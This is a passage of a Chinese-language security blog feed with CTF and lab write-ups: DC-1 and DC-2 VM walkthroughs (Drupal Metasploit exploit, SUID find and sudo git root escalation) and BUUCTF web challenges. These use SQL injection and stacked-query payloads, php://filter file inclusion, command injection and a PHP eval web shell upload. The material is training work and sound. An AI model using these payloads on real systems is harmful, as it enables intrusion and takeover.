alt="img"></p><p>$PATH是一个环境变量，存储了系统正在执行命令时，查找 </p><p>然后进行绕过</p><p>BASH_CMDS[a]&#x3D;&#x2F;bin&#x2F;sh;a</p><p>&#x2F;bin&#x2F;bash</p><p>export PATH&#x3D;$PATH:&#x2F;bin&#x2F; </p><p>最后导入环境变量</p><p><img src="/../dc-2/1732790061112-0e7b5f7c-a24f-4722-ab42-931390467591.png" alt="img"></p><p>然后就可以执行cat（因为这里我改了flag的内容，所以最后结果是hello world）</p><p><img src="/../dc-2/1732790183072-9d58b499-8288-435c-bccd-6bf533ad3c59.png" alt="img"></p><p>然后尝试进入jerry这个用户</p><p>最后拿到flag4</p><p><img src="/../dc-2/1732790282915-cbc41f79-9988-4f8c-9688-df0ad4b17490.png" alt="img"></p><p>查找具有suid权限的可执行的二进制文件</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/../dc-2/1732790669840-c4acf640-96ae-4010-95ed-61337124e615.png" alt="img"></p><p>查看哪些命令具有root权限：sudo -l</p><p><img src="/../dc-2/1732791623741-47988aa7-9d49-48d6-9adb-2a06341144be.png" alt="img"></p><p>发现一个git</p><p>git提权：</p><p>输入:sudo git -p –help</p><p>再接着输入：!&#x2F;bin&#x2F;bash</p><p>然后就可以直接进入到root用户了，拿到最后的flag</p><p><img src="/../dc-2/1732791884073-0f30c255-c2d7-4812-93fe-d1e6a037acc4.png" alt="img"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dc-1</title>
      <link href="/2025/04/04/dc-1/"/>
      <url>/2025/04/04/dc-1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><h3 id="收集靶机的mac地址"><a href="#收集靶机的mac地址" class="headerlink" title="收集靶机的mac地址"></a>收集靶机的mac地址</h3><span id="more"></span><p>这个就直接在靶机的网络适配器中的高级选项中就可以看见，</p><p><img src="/../dc-1/1731508421109-ece8bc63-cdce-4e65-9cb8-c2e93624ef18.png" alt="img"></p><p>于是得到靶机的mac地址：00:0C:29:FB:D1:43</p><h3 id="目标发现（内网扫描）"><a href="#目标发现（内网扫描）" class="headerlink" title="目标发现（内网扫描）"></a>目标发现（内网扫描）</h3><p>1、使用arp-scan 进行内网扫描</p><p>命令：arp-scan -l</p><p><img src="/../dc-1/1731508598461-eaefc90c-8334-452c-8143-c76c121e3f58.png" alt="img"></p><p>第一个地址是ip地址，第二个地址对应的是mac地址</p><p>于是根据mac地址，找到对应的ip地址：192.168.126.137</p><p>2、使用namp进行内网扫描</p><p>命令：nmap -sP 192.168.126.0&#x2F;24</p><p><img src="/../dc-1/1731508978938-0da399e7-056d-4496-9cde-6ff87d885c33.png" alt="img"></p><p>作用：执行ping扫描，这会检测哪些主机在线，而不会进行端口扫描，在新版本中-sP 已经被 -sn代替，但是他们的功能相同。 这个命令会扫描 <code>192.168.126.0</code> 到 <code>192.168.126.255</code> 范围内的所有 IP 地址  </p><p>3、使用masscan进行内网扫描</p><p>命令：masscan –ping 192.168.126.0&#x2F;24</p><p><img src="/../dc-1/1731509491016-54662ce0-791c-4951-84f8-4f1f9b2da766.png" alt="img"></p><h3 id="发现目标后进行进一步的信息获取："><a href="#发现目标后进行进一步的信息获取：" class="headerlink" title="发现目标后进行进一步的信息获取："></a>发现目标后进行进一步的信息获取：</h3><p>1、使用masscan对目标192.168.126.137进行端口扫描</p><p>命令： masscan 192.168.126.137 -p0-65535 –rate&#x3D;10000 </p><p><img src="/../dc-1/1731509786227-db2a40c1-e997-431d-a2ae-ff050c370bfb.png" alt="img"></p><p>2、使用nmap进行端口扫描</p><p>命令：nmap -sV 192.168.126.137</p><p><img src="/../dc-1/1731509915543-e1ac7fba-d559-4964-bea1-26e61be48a8c.png" alt="img"></p><p>nmap -sV 192.168.126.0&#x2F;24</p><p>也行，这个只不过是对192.168.126.0到192.168.126.255所有的ip地址进行扫描</p><p><img src="/../dc-1/1731509972492-b75d2dd8-eda9-4f92-995a-bc3d7a1b6a14.png" alt="img"></p><p>或者进行更详细的端口信息扫描</p><p>命令：nmap -p 80,111,44077 -A 192.168.126.137</p><p><img src="/../dc-1/1731510199240-55c28ce1-57c8-4143-99bc-39865374de6c.png" alt="img"></p><p>通过这条命令发现，其80端口开放着Drupal 7的http服务，111端口是rpcbind服务</p><p>这里也可以使用whatweb -v  ip       来查找它对应的cms版本<img src="/../dc-1/1731510782945-c1821673-c51c-4f12-a704-57c630da59fb.png" alt="img"></p><h3 id="通过msfconsole获取flag1"><a href="#通过msfconsole获取flag1" class="headerlink" title="通过msfconsole获取flag1"></a>通过msfconsole获取flag1</h3><p>因为它是开放着的80端口，所以直接访问ip，进入网站，发现是一个登录页面</p><p><img src="/../dc-1/1731510543670-63def8ec-42ae-49eb-8b94-31858cea80cd.png" alt="img"></p><p>因为上面的到他的cms是drupal 7，百度了一下，存在漏洞</p><p><img src="/../dc-1/1731511083657-473e4a52-e8c3-4981-89d7-495a0dd5673f.png" alt="img"></p><p>输入msfconsole，打开msf</p><p>搜索：search Drupal<img src="/../dc-1/1731513543361-449d45c6-d98a-4c44-b1a7-0a4bd2cd6132.png" alt="img"></p><p>可以看到一个2018年的，</p><p>使用第二个漏洞：use 2</p><p>使用show options 查看当前设置好的信息，yes是需要设置的<img src="/../dc-1/1731513848482-9e7a76b2-86cb-4621-b373-6d1156f651cb.png" alt="img"></p><p>把RHOSTS设置成目标ip：set RHOSTS 192.168.126.137</p><p>再次show options，可以看到已经被设置</p><p><img src="/../dc-1/1731513959483-67d61d2b-0359-4108-923f-9f9a073b2aef.png" alt="img"></p><p>输入run，开始攻击</p><p><img src="/../dc-1/1731514076107-47c66978-b962-4d3c-a6f6-1b94acfb67c6.png" alt="img"></p><p>显示meterpreter，攻击成功</p><p>现在就可以执行命令了，拿到第一个flag1<img src="/../dc-1/1731514145392-601d1031-9d12-44a0-bd45-a439cac0f0c8.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>第一个flag提示我们看配置文件，问一下ai<img src="/../dc-1/1731514738769-91ec8be1-9ec3-426d-81e5-9582eacaa13f.png" alt="img"></p><p>直接cat</p><p><img src="/../dc-1/1731514789722-d0c108c8-e442-417f-8e29-444f81ffdeb0.png" alt="img"></p><p>看到了flag2</p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里先通过msf建立一个交互式shell</p><p>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><p><img src="/../dc-1/1731515108187-9ff21b54-e84c-437c-9a3f-5fc3f97c15e4.png" alt="img"></p><p>通过刚刚拿到的mysql账号跟密码登录mysql</p><p>、命令：mysql -udbuser -pR0ck3t</p><p><img src="/../dc-1/1731515175965-cad97b18-3f5d-47f9-a923-26f4d52cf91e.png" alt="img"></p><p>通过查询数据库，表（users），最后查询到<img src="/../dc-1/1731515302807-393d634a-715b-46a0-be1d-e9adbabc6c79.png" alt="img"></p><p>最后发现有两个用户，一个是admin，一个是fred，密码都是经过hash加密的，所以要先找到加密的脚本</p><p>find &#x2F; -name <em>password</em></p><p><img src="/../dc-1/1731515771491-bea37f8d-6f25-4313-aeb7-7db185706ea3.png" alt="img"></p><p>找到一个&#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh，.sh是shell脚本文件，通常可以直接执行</p><p>cat一下，发现是一个php文件</p><p><img src="/../dc-1/1731515892806-7a7f3658-712f-4ee2-8cf3-31b98cc3c911.png" alt="img"></p><p>使用命令生成一个新的hash值</p><p>php .&#x2F;scripts&#x2F;password-hash.sh 123456</p><p><img src="/../dc-1/1731662767225-aeea214a-528a-46f1-bab3-b51b1fad5e06.png" alt="img"></p><p>$S$DhG9D2tbKmohxhcQGSCgrEQV.81ZlX0OsCApH8uyneC4bv&#x2F;5WRfe</p><p>查看当前的用户和密码</p><p><img src="/../dc-1/1731516283605-69bd9a1f-8cf5-4fc6-bfb1-9c7d3a4346ad.png" alt="img"></p><p>然后通过mysql的update命令来更新密码，命令：</p><p>update users set pass&#x3D;”$S$Da4HXFW3Pwd9UaTtSFIgMbQd.AEONzo5vUy0mH05f.PtaSXg7dnZ” where name&#x3D;”admin”;</p><p><img src="/../dc-1/1731662867371-46f332bf-1e72-41cb-a950-2bbe6a6c2a8f.png" alt="img"></p><p>最后成功登录，拿到flag3（在content模块）<img src="/../dc-1/1731662910109-e0ba703a-73cf-4059-82b2-a2e5bbf7f28d.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>现在已经可以执行命令了，当然最重要的就是查看 &#x2F;etc&#x2F;passwd，查看用户和权限</p><p><img src="/../dc-1/1731514250440-540afc8f-1509-4d77-8c77-f07ec0879005.png" alt="img"></p><p>看到有个flag4的用户，然后，直接进入&#x2F;home&#x2F;flag4这个目录，拿到flag4</p><p><img src="/../dc-1/1731663134505-e88d93c5-aff9-49c3-a0c8-d5ed04206be9.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>由上一个flag4提示，猜测root也有个flag</p><p>需要用到suid提权，利用find命令，查找具有suid权限的可执行二进制文件。</p><p>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p><p><img src="/../dc-1/1731663475606-e973d44b-58bf-4376-9683-eaeb4e7862a9.png" alt="img"></p><p>看到一个find，可以执行root权限的命令查找文件，这里find要查找的文件需要是一个存在的文件。所以就用flag1.txt了</p><p>find &#x2F; -name flag1.txt -exec “&#x2F;bin&#x2F;sh” ;</p><p><img src="/../dc-1/1731664338157-8b4341a8-ca30-4fba-8240-8aeba4d0ddbd.png" alt="img"></p><p>然后利用cd &#x2F;root切换到root用户，拿到最后的flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buu第一页</title>
      <link href="/2025/04/04/buu%E7%AC%AC%E4%B8%80%E9%A1%B5/"/>
      <url>/2025/04/04/buu%E7%AC%AC%E4%B8%80%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<p>z之前写的，把它放在博客上吧</p><span id="more"></span><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>测试密码单引号出现</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570752160-3c1b8358-683b-45ca-9d40-d57c020be211.png" alt="img"></p><p>断定存在sql注入，试了一下万能密码，flag直接就出来了</p><p>最后的答案：1’ or 1&#x3D;1#<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570795869-ea89c416-cdf5-4dd9-bb20-ad9d8941c442.png" alt="img"></p><p>拿到flag</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729570898971-7af6eebe-7562-4132-bc89-0e92d378dfce.png" alt="img">查看源码，发现，在源码里插入了一段php代码，如果cat&#x3D;dog，就会输出一个东西，所以就试一试，最后flag直接就出来了</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1729571004490-273cf837-0ea7-4697-b01c-0a6e9125ca35.png" alt="img"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>这题查看源码得到一个文件source.php，是一段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            //如果要返回true，$page需要有值，并且是字符串</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            //如果要返回true，$page的值需要包含白名单hint.php或者source.php</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            //mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)表示在$page的最后添加一个？，mb_strpos也就是返回第一个问号出现的位置</span><br><span class="line">            //这段代码表示：返回$page问号之前的部分的值给$_page</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            //检查$_page中是否含有白名单，如果有返回true</span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            //这段代码就是进行解码，然后进行上一步操作</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>首先是一个类，类中有个函数checkFile，总体来看，要想拿到flag，传入的file就要在?之前的内容包含白名单，</p><p>最后的payload：<br><a href="http://a60c7759-77a0-4d5b-9f92-9cabe917d48b.node5.buuoj.cn:81/source.php?file=hint.php?../../../../../ffffllllaaaagggg">http://a60c7759-77a0-4d5b-9f92-9cabe917d48b.node5.buuoj.cn:81/source.php?file=hint.php?../../../../../ffffllllaaaagggg</a></p><p>这里有个注意就是：在include文件包含的时候，会把hint.php?当成一个不存在的目录（如果一个目录不存在就会自动生成，与前面的source.php在同一级目录），最后再利用目录穿越，包含文件ffffllllaaaagggg</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>这一题打开就出现这个，查看源码也没有什么东西，但是注意到网址</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729416246-9211e602-d615-4fee-b9e0-7f939830ccce.png" alt="img"></p><p><a href="http://ab5a96ef-ee92-4513-b177-f165752c01e4.node5.buuoj.cn:81/?file=flag.php">http://ab5a96ef-ee92-4513-b177-f165752c01e4.node5.buuoj.cn:81/?file=flag.php</a></p><p>最后的?file&#x3D;flag.php，看起来像一个文件包含，可能是因为一些编码的问题，导致flag无法显示出来，</p><p>于是就用base64编码，</p><p>payload：</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729582258-8e0efdc7-8a05-4dd7-a085-5664a366db19.png" alt="img"></p><p>最后就出来了</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729635392-43bea9f1-0d97-4587-8bee-8ae48b8a077b.png" alt="img"></p><p>最后解码是一个php代码，如果不转为base64，就会直接当成php代码执行，所以只会输出最开始那样</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1730729794168-fabd5383-f41c-4cbf-a42e-9f36b0be6970.png" alt="img"></p><p>这题就是一个ping，利用分号可以同时执行多个命令，</p><p>最后的payload：localhost;cat &#x2F;flag</p><p>也就是现会ping本地，然后再执行cat &#x2F;flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这题相对于上一题，就是把flag和空格ban了，</p><p>但是还可以用变量替换：</p><p><a href="http://413d2715-06dd-4801-8aee-1ede20d27729.node5.buuoj.cn:81/?ip=localhost;w=ag.php;q=fl;cat$IFS$9$q$w">http://413d2715-06dd-4801-8aee-1ede20d27729.node5.buuoj.cn:81/?ip=localhost;w=ag.php;q=fl;cat$IFS$9$q$w</a></p><p>还有个注意的是，贪婪匹配导致不能依次出现 f  l   a  g  这四个字母</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>这题考察的是堆叠注入，所谓的堆叠注入就是可以执行多条sql语句</p><p>这题的话，首先，输入1有结果，而0没有结果，所以猜测存在或运算 ||</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058177785-fc33094e-21bb-4a7d-a221-7c70a917d5ce.png" alt="img"></p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058188476-8b79df77-265d-407b-acd6-cb4bc65c37ad.png" alt="img"></p><p>接着查询数据库，在后面加上一条语句，select databases；</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058336587-75ce2d5f-58b0-4c1f-a581-b45b3620bc7a.png" alt="img"></p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058333446-2677aea5-d032-49c4-9e95-03622382d472.png" alt="img"></p><p>然后看大佬的wp说sql语句是：select $_POST[‘query’] || flag from Flag;</p><p>show databases;                            显示所有数据库</p><p>show tables;                                   显示所有列</p><p>show columns from table;             从table这个表里展示所有列</p><h3 id="第一种解法"><a href="#第一种解法" class="headerlink" title="第一种解法"></a>第一种解法</h3><p>直接payload：</p><p>1;select *,1<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058418219-3eea845e-a45f-4b36-8220-653be08acf05.png" alt="img"></p><p>解释一下就是1先于flag进行或运算，得到结果1，然后执行查询语句</p><p>select 1;select *,1 from Flag;</p><p>最后的查询结果其实就是查出来flag了，然后在最后加上一列1</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733058568478-254b9cca-f6cd-4ac6-a390-09a38c4cde94.png" alt="img"></p><h3 id="第二中解法"><a href="#第二中解法" class="headerlink" title="第二中解法:"></a>第二中解法:</h3><p>这种解法就是将   ||  运算符当作连接符号，</p><p>需要配置SQL_mode&#x3D;PIPES_AS_CONCAT</p><p>payload:</p><p>query&#x3D;1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733059957240-6d6b9de3-a67e-4bc3-b9ad-04efd82dd04e.png" alt="img"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>sql注入首先判断sql语句的闭合形式，经过测试，这题是单引号闭合，爆数据库</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733060673924-a600daf2-90e3-423e-a896-3825c49746cb.png" alt="img"></p><p>爆表；</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733060705214-3672309a-f7ac-4d47-9979-0d18301dd021.png" alt="img"></p><p>知识点：</p><p>当需要查询一个数字表的时候，需要将数字用反引号包裹起来</p><p>?inject&#x3D;1’;show columns from <code>1919810931114514</code>;</p><p>这里因为select 被过滤了，先用show来看一下有哪些列</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733060888473-026bfd20-4dd7-4db2-a4aa-989feb041f83.png" alt="img"></p><p>然后看到有个flag的列。</p><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>十六进制编码绕过：</p><p>将select * from <code>1919810931114514</code>;进行十六进制编码</p><p>得到：73656c656374202a2066726f6d20603139313938313039333131313435313460</p><p>然后将他赋给一个变量：seT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460</p><p>最后的payload：</p><p>1’;seT@a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;</p><p>注意加上十六进制标签：0x</p><p>prepare…from…   ：是预处理语句，会进行编码转换</p><p>execute   ：用来执行prepare创建的sql语句。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733061979550-23cb4c96-1fa9-4067-bc97-1901821aaf63.png" alt="img"></p><h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>使用handler语句：</p><p>handler table_name open;打开一个表名</p><p>handler table_name read first&#x2F;next;        获取这个表的第一行&#x2F;下一行</p><p>payload：</p><p>1’;handler <code>1919810931114514</code> open;handler <code>1919810931114514</code> read first;</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733062937740-fe8e76c8-4fc7-4d9a-9b4c-2ab931facc01.png" alt="img"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="解法三："><a href="#解法三：" class="headerlink" title="解法三："></a>解法三：</h3><p>利用concat拼接select+预处理</p><p>payload:</p><p>1’;prepare a from concat(‘s’,’elect * from <code>1919810931114514</code>‘);execute a;#</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733063784575-a71b1392-2f17-4474-8dbc-90308330a45a.png" alt="img"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>这就是纯一道简单sql题目，没有什么过滤，过滤了#可以使用%23来代替</p><p>首先爆表：</p><p>123’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147279039-78c33e83-083a-46c6-8be9-19f652c29fa0.png" alt="img"></p><p>然后爆列：（这里试过第一个表了，没有什么东西）</p><p>123’ union select  1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;’l0ve1ysq1’%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147329085-1112895b-1ad8-4053-b0db-2f4593c0a3dc.png" alt="img"></p><p>最后拿到flag：</p><p>123’ union select 1,group_concat(username,’~’,password),3 from l0ve1ysq1%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147377928-f28f09a7-6799-4276-b4d6-fb114bbec505.png" alt="img"></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>这题打开，查看源码，发现一个php文件</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733147727553-efa7025d-b379-4f3f-9a28-d791a2f27071.png" alt="img"></p><p>最后通过抓包发现一个secr3t.php</p><p>最后是一个代码审计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>strstr($file,”..&#x2F;“)：用来检查$file中是否含有..&#x2F;，如果有返回true，否则false</p><p>stristr($file, “tp”)：用来检查$file中是否含有 tp（忽略大小写），函数中的i表示忽略大小写，有返回true</p><p>..&#x2F; ：file协议就被限制了</p><p>还可以有php为协议，首先的话是先试了一下根目录下的flag.php，没回显</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.php</p><p>再试&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php，</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p><p>最后拿去解码，直接出flag</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733148573125-00a42cb7-0dae-4a83-b695-e45f6be5671f.png" alt="img"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>最后的数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /Secret.php HTTP/1.1</span><br><span class="line">Host: node5.buuoj.cn:28819</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For: localhost</span><br><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>这题是一个文件上传，首先试一试php能不能上传（</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149572070-ad6f4a2f-cc2e-4605-af0c-56d4679fa9eb.png" alt="img"></p><p>改文件类型，然后加GIF89a</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149646471-2c5c331d-6b60-4c9a-8475-2e7c897846c2.png" alt="img"></p><p>这次是php，然后改后缀为phtml</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149679799-20c857e3-5c84-497f-9af6-4c479a908cdf.png" alt="img"></p><p>然后是php标识符，换一个木马：</p><script language="php">@eval($_POST['cmd'])</script><p>最后上传成功，数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 